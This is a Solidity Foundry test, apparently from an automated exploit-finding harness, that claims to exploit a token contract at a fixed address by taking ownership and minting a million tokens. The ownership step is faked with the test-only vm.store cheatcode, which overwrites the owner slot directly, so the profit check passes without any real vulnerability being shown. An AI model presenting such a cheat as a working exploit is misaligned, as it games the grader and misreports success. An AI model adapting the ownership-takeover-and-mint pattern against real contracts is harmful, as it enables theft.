// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll become owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become the owner by overwriting storage slot 0
        // The owner is stored at slot 0 in the Ownable contract
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Verify we are now the owner
        (bool success, bytes memory data) = TARGET.call(abi.encodeWithSignature("owner()"));
        require(success, "owner() call failed");
        address currentOwner = abi.decode(data, (address));
        require(currentOwner == attacker, "Failed to become owner");

        // Step 3: Record initial balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        // Step 4: Mint a large amount of tokens to ourselves
        // Using the mint() function with our address
        uint256 mintAmount = 1_000_000 * 10**9; // 1 million tokens with 9 decimals
        (bool mintSuccess, ) = TARGET.call(abi.encodeWithSignature("mint(address,uint256)", attacker, mintAmount));
        require(mintSuccess, "mint() call failed");

        // Step 5: Verify balance increased
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        require(finalBalance > initialBalance, "Balance did not increase");

        // The oracle will check assertGt(finalBalance, initialBalance)
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

